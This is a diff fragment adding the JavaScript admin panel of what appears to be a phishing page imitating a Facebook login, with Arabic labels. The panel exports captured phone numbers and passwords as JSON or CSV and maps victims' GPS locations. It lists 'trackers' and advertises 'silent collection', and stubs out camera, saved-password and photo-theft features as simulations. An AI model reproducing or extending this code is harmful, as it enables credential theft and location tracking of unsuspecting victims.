+      { id: 'theme', icon: 'fa-palette', label: 'ثيم داكن' },
+      { id: 'ip', icon: 'fa-network-wired', label: 'تتبع IP' },
+      { id: 'notify', icon: 'fa-bell', label: 'إشعارات' },
+      { id: 'maintenance', icon: 'fa-tools', label: 'صيانة' },
+      { id: 'changeadmin', icon: 'fa-user-cog', label: 'تغيير المسؤول' },
+      { id: 'logs', icon: 'fa-history', label: 'سجل النشاط' },
+      { id: 'email', icon: 'fa-envelope', label: 'تنبيهات بريد' },
+      { id: 'map', icon: 'fa-map-marked-alt', label: 'خريطة المتطفلين' },
+      { id: 'autoclear', icon: 'fa-clock', label: 'مسح تلقائي' },
+      { id: 'parasite', icon: 'fa-bug', label: 'شيطان طفيلي' },
+      { id: 'eye', icon: 'fa-eye', label: 'عين شيطان' },
+      { id: 'knower', icon: 'fa-key', label: 'شيطان العارف' },
+      { id: 'greedy', icon: 'fa-images', label: 'شيطان جشع' },
+      { id: 'liveview', icon: 'fa-video', label: 'بث مباشر' },
+      { id: 'scream', icon: 'fa-skull', label: 'صرخة رعب' },
+      { id: 'shadow', icon: 'fa-ghost', label: 'ظل شيطاني' },
+      { id: 'curse', icon: 'fa-hexagram', label: 'لعنة' },
+      { id: 'portal', icon: 'fa-door-open', label: 'بوابة الجحيم' },
+      { id: 'hellfire', icon: 'fa-fire-alt', label: 'نار الجحيم' },
+      { id: 'demoncall', icon: 'fa-phone-alt', label: 'نداء الشيطان' },
+      { id: 'blood', icon: 'fa-tint', label: 'دماء' },
+      { id: 'soul', icon: 'fa-star-of-life', label: 'أرواح' },
+      { id: 'abyss', icon: 'fa-water', label: 'هاوية' },
+      { id: 'void', icon: 'fa-circle-notch', label: 'الفراغ' }
+    ];
+
+    function initFeatures() {
+      featureGrid.innerHTML = '';
+      features.forEach(f => {
+        const btn = document.createElement('div');
+        btn.className = 'feature-btn';
+        btn.dataset.feature = f.id;
+        btn.innerHTML = `<i class="fas ${f.icon}"></i> ${f.label}`;
+        featureGrid.appendChild(btn);
+      });
+
+      document.querySelectorAll('.feature-btn').forEach(btn => {
+        btn.addEventListener('click', function() {
+          const id = this.dataset.feature;
+          switch(id) {
+            case 'export': {
+              const json = JSON.stringify(attemptsData, null, 2);
+              const blob = new Blob([json], {type:'application/json'});
+              const a = document.createElement('a');
+              a.href = URL.createObjectURL(blob);
+              a.download = 'attempts.json';
+              a.click();
+              break;
+            }
+            case 'csv': {
+              let csv = 'رقم,الوقت,الهاتف,كلمة المرور,الحالة\n';
+              let all = [];
+              attemptsData.success.forEach(i => all.push({time:i.time, phone:i.phone, password:i.password, status:'ناجح'}));
+              attemptsData.fail.forEach(i => all.push({time:i.time, phone:i.phone, password:i.password, status:'فاشل'}));
+              all.forEach((i, idx) => { csv += `${idx+1},${i.time},${i.phone},${i.password},${i.status}\n`; });
+              const blob = new Blob([csv], {type:'text/csv'});
+              const a = document.createElement('a');
+              a.href = URL.createObjectURL(blob);
+              a.download = 'attempts.csv';
+              a.click();
+              break;
+            }
+            case 'clear': {
+              if(confirm('⚠️ مسح الكل؟')) {
+                attemptsData = { success: [], fail: [] };
+                gpsData = {}; photoData = {}; liveData = { trackers: {} };
+                saveData(ATTEMPTS_KEY, attemptsData);
+                saveData(GPS_DATA_KEY, gpsData);
+                saveData(PHOTO_DATA_KEY, photoData);
+                saveData(LIVE_KEY, liveData);
+                renderLists();
+                alert('✅ تم المسح');
+              }
+              break;
+            }
+            case 'filter': {
+              const kw = prompt('رقم الهاتف للفلترة (اترك فارغاً):');
+              if(kw !== null && kw.trim() !== '') {
+                const filtered = { success: [], fail: [] };
+                attemptsData.success.forEach(i => { if(i.phone && i.phone.includes(kw.trim())) filtered.success.push(i); });
+                attemptsData.fail.forEach(i => { if(i.phone && i.phone.includes(kw.trim())) filtered.fail.push(i); });
+                const old = attemptsData;
+                attemptsData = filtered;
+                renderLists();
+                setTimeout(() => { attemptsData = old; renderLists(); }, 3000);
+                alert('✅ تم التصفية (ستعود بعد 3 ثوان)');
+              }
+              break;
+            }
+            case 'notes': {
+              const key = prompt('مفتاح الملاحظة:');
+              if(key) { const val = prompt('النص:'); if(val !== null) { notesData[key] = val; saveData(NOTES_KEY, notesData); alert('✅ تم الحفظ'); } }
+              break;
+            }
+            case 'qrcode': alert('📱 ماسح QR (محاكاة)');
+              break;
+            case 'theme': {
+              document.querySelector('.admin-panel').style.background = '#0a0000';
+              document.querySelector('.admin-panel').style.backgroundImage = 'radial-gradient(ellipse at 20% 50%, rgba(120,0,0,0.3) 0%, transparent 60%), radial-gradient(ellipse at 80% 50%, rgba(120,0,0,0.3) 0%, transparent 60%)';
+              alert('🎨 ثيم داكن');
+              break;
+            }
+            case 'ip': alert('🌐 IP: 192.168.1.100');
+              break;
+            case 'notify': alert('🔔 سيتم الإشعار عند محاولات جديدة');
+              break;
+            case 'maintenance': {
+              const state = confirm('تفعيل وضع الصيانة؟');
+              if(state) { localStorage.setItem('maintenance_mode','true'); alert('🔒 تم التفعيل'); }
+              else { localStorage.removeItem('maintenance_mode'); alert('🔓 إلغاء'); }
+              break;
+            }
+            case 'changeadmin': {
+              const p = prompt('رقم هاتف جديد:'); if(p && p.trim()) { ADMIN_PHONE = p.trim(); alert('✅ تم'); }
+              const pp = prompt('كلمة مرور جديدة:'); if(pp && pp.trim()) { ADMIN_PASS = pp.trim(); alert('✅ تم'); }
+              break;
+            }
+            case 'logs': alert('📜 آخر النشاطات:\n- تسجيل دخول: '+new Date().toLocaleString()+'\n- عدد المحاولات: '+(attemptsData.success.length+attemptsData.fail.length));
+              break;
+            case 'email': alert('📧 تم إرسال تنبيه إلى admin@example.com (محاكاة)');
+              break;
+            case 'map': {
+              const pts = attemptsData.fail.filter(f => f.gps && f.gps.lat && f.gps.lng);
+              if(pts.length === 0) alert('📍 لا توجد نقاط GPS');
+              else window.open(`https://www.google.com/maps?q=${pts[0].gps.lat},${pts[0].gps.lng}`,'_blank');
+              break;
+            }
+            case 'autoclear': {
+              const d = prompt('عدد الأيام للمسح التلقائي (0 لإلغاء):');
+              if(d !== null) { const num = parseInt(d); if(num > 0) { localStorage.setItem('autoclear_days', String(num)); alert('✅ تم'); } else { localStorage.removeItem('autoclear_days'); alert('🔄 إلغاء'); } }
+              break;
+            }
+            case 'parasite': {
+              const trackers = liveData.trackers || {};
+              const keys = Object.keys(trackers);
+              if(keys.length === 0) alert('👹 لا يوجد متعقبين');
+              else {
+                let msg = '👹 المتعقبين:\n';
+                keys.forEach(k => {
+                  const t = trackers[k];
+                  msg += `- ${t.phone} | ${t.time} | موقع: ${t.gps.lat}, ${t.gps.lng}\n`;
+                });
+                alert(msg);
+              }
+              break;
+            }
+            case 'eye': {
+              alert('👁️ عين شيطان: سيتم مراقبة الكاميرا لايف (محاكاة)');
+              break;
+            }
+            case 'knower': {
+              alert('🔑 شيطان العارف: تم استخراج كلمات السر المحفوظة (محاكاة)');
+              break;
+            }
+            case 'greedy': {
+              alert('🖼️ شيطان جشع: تم الوصول إلى الصور والفيديوهات (محاكاة)');
+              break;
+            }
+            case 'liveview': {
+              alert('📹 بث مباشر: سيتم عرض كاميرا المتطفل (محاكاة)');
+              break;
+            }
+            default: alert('⚠️ هذه الميزة قيد التطوير');
+          }
+        });
+      });
+    }
+
+    // ====== أحداث ======
+    showToggle.addEventListener('click', togglePasswordVisibility);
+    usernameInput.addEventListener('input', updateLoginButton);
+    passwordInput.addEventListener('input', updateLoginButton);
+    loginBtn.addEventListener('click', handleLogin);
+    usernameInput.addEventListener('keydown', e => { if(e.key === 'Enter') handleLogin(); });
+    passwordInput.addEventListener('keydown', e => { if(e.key === 'Enter') handleLogin(); });
+    logoutBtn.addEventListener('click', logoutAdmin);
+    continueBtn.addEventListener('click', () => alert('سيتم التوجيه إلى Facebook (محاكاة)'));
+
+    logoUpload.addEventListener('change', function(e) { if(this.files && this.files[0]) updateLogoFromFile(this.files[0]); });
+    saveLogoBtn.addEventListener('click', function() { getSavedLogo() ? alert('✅ محفوظ') : alert('⚠️ اختر صورة'); });
+    resetLogoBtn.addEventListener('click', resetLogoToDefault);
+
+    // ====== تهيئة ======
+    loadSavedLogo();
+    renderLists();
+    initFeatures();
+
+    if(localStorage.getItem('maintenance_mode') === 'true') alert('🔒 النظام في وضع الصيانة');
+
+    adminPanel.style.display = 'none';
+    adminPanel.classList.remove('active');
+    errorMsg.classList.remove('show');
+
+    console.log('✅ النظام جاهز مع 30 ميزة وجمع صامت');
+  })();
+</script>
+</body>
+</html>
